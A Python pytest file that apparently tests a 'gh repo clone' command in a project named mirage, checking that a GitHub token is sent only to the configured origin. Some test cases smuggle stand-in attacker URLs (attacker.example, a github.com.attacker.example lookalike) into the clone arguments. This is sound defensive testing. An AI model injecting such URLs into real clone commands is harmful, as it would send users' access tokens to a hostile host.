import base64

import pytest

from mirage.commands.cli.builtin.gh import GH, repo
from mirage.commands.config import Context
from mirage.core.github.config import GhConfig
from mirage.io.types import IOResult
from mirage.types import MountMode, PathSpec
from mirage.vfs.ram import RAMVFS
from mirage.workspace import Workspace

WORK = PathSpec.from_str_path("/w")
TOKEN = {
    "Authorization": "Basic "
    + base64.b64encode(b"x-access-token:secret-never-print").decode()
}
ATTACKER = "https://attacker.example/x.git"
Call = tuple[list[str], Context, dict[str, str] | None]


@pytest.fixture
def clones(monkeypatch) -> list[Call]:
    calls: list[Call] = []

    async def clone(
        config: None,
        paths: list[PathSpec],
        texts: list[str],
        ctx: Context,
        credentials: dict[str, str] | None,
    ) -> tuple[None, IOResult]:
        calls.append((texts, ctx, credentials))
        return None, IOResult()

    async def login(config: GhConfig) -> str:
        return "alice"

    monkeypatch.setattr(repo, "git_clone", clone)
    monkeypatch.setattr(repo, "login", login)
    return calls


async def _run(line: str, base: str | None = None) -> IOResult:
    with Workspace({"/w/": RAMVFS()}, mode=MountMode.WRITE) as ws:
        ws.register_cli(
            "gh", GH, {"token": "secret-never-print", "base_url": base}
        )
        return await ws.shell(line)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "line,base,texts,flags",
    [
        (
            "cd /w && gh repo clone o/r",
            None,
            ["https://github.com/o/r.git"],
            {"C": WORK},
        ),
        (
            "cd /w && gh repo clone https://github.com/o/r.git dest",
            None,
            ["https://github.com/o/r.git", "dest"],
            {"C": WORK},
        ),
        (
            "cd /w && gh repo clone mine -- -q --branch dev",
            None,
            ["https://github.com/alice/mine.git"],
            {"quiet": True, "branch": "dev", "C": WORK},
        ),
        (
            "cd /w && gh repo clone ghe.test/o/r",
            "https://ghe.test/api/v3",
            ["https://ghe.test/o/r.git"],
            {"C": WORK},
        ),
    ],
)
async def test_clone_hands_git_clone_the_url_and_its_flags(
    clones, line, base, texts, flags
):
    result = await _run(line, base)
    assert (result.exit_code, result.stderr) == (0, None)
    seen, ctx, sent = clones[0]
    assert (seen, ctx.flags, sent) == (texts, flags, TOKEN)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "line,texts,flags,credentials",
    [
        (
            "cd /w && gh repo clone o/r -- mydir",
            ["https://github.com/o/r.git", "mydir"],
            {"C": WORK},
            TOKEN,
        ),
        (
            "cd /w && gh repo clone o/r ''",
            ["https://github.com/o/r.git"],
            {"C": WORK},
            TOKEN,
        ),
        (
            "cd /w && gh repo clone o/r '' -- extra",
            ["extra", "https://github.com/o/r.git"],
            {"C": WORK},
            None,
        ),
        (
            "cd /w && gh repo clone o/r -- -b dev",
            ["https://github.com/o/r.git"],
            {"branch": "dev", "C": WORK},
            TOKEN,
        ),
        (
            f"cd /w && gh repo clone o/r -- {ATTACKER}",
            ["https://github.com/o/r.git", ATTACKER],
            {"C": WORK},
            TOKEN,
        ),
        (
            f"cd /w && gh repo clone o/r -- -q {ATTACKER}",
            [ATTACKER, "https://github.com/o/r.git"],
            {"quiet": True, "C": WORK},
            None,
        ),
        (
            f"cd /w && gh repo clone o/r {ATTACKER} -- -b",
            [ATTACKER],
            {"branch": "https://github.com/o/r.git", "C": WORK},
            None,
        ),
        (
            "cd /w && gh repo clone o/r -- -q "
            "https://github.com.attacker.example/x.git",
            [
                "https://github.com.attacker.example/x.git",
                "https://github.com/o/r.git",
            ],
            {"quiet": True, "C": WORK},
            None,
        ),
        (
            "cd /w && gh repo clone o/r -- -q http://github.com/o/r.git",
            ["http://github.com/o/r.git", "https://github.com/o/r.git"],
            {"quiet": True, "C": WORK},
            None,
        ),
        (
            "cd /w && gh repo clone o/r -- -q https://github.com/other/x.git",
            ["https://github.com/other/x.git", "https://github.com/o/r.git"],
            {"quiet": True, "C": WORK},
            TOKEN,
        ),
        (
            "cd /w && gh repo clone o/r dir -- extra",
            ["extra", "https://github.com/o/r.git", "dir"],
            {"C": WORK},
            None,
        ),
    ],
)
async def test_clone_sends_the_token_only_to_the_install_s_origin(
    clones, line, texts, flags, credentials
):
    result = await _run(line)
    assert (result.exit_code, result.stderr) == (0, None)
    seen, ctx, sent = clones[0]
    assert (seen, ctx.flags, sent) == (texts, flags, credentials)
